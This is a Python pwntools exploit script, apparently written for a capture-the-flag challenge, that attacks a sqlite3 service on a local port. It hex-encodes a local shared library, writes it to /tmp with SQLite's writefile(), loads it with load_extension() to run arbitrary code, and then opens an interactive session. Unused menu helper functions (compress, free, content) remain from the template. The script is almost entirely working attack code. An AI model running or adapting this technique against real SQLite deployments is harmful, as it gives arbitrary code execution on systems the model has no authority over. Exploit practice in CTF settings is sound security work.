#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './sqlite3'
context.terminal = ['tmux', 'new-window']
argv = []
env = {}
libc = ELF('./libc-2.31.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def compress(text):
    io.sendlineafter(">", str(1))
    io.sendlineafter("text:", text)

def decompress(text):
    io.sendlineafter(">", str(2))
    io.sendlineafter("text:", text)

def content(idx):
    io.sendlineafter(">", str(5))
    io.sendlineafter("Idx: ", str(idx))

def free(idx, compressed=True):
    io.sendlineafter(">", str(3))
    if compressed:
        io.sendlineafter("(c/d):", "c")
    else:
        io.sendlineafter("(c/d):", "d")

    io.sendlineafter("Idx: ", str(idx))

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# release = 3 weeks ago

io = start(argv, env=env)

with open("lib.so", "rb") as f:
    data = f.read()

data = data.hex()

payload = f"SELECT writefile('/tmp/lib.so', x'{data}');"

io.sendlineafter(">",payload)

io.sendlineafter(">", "SELECT load_extension('/tmp/lib.so');")

io.interactive()

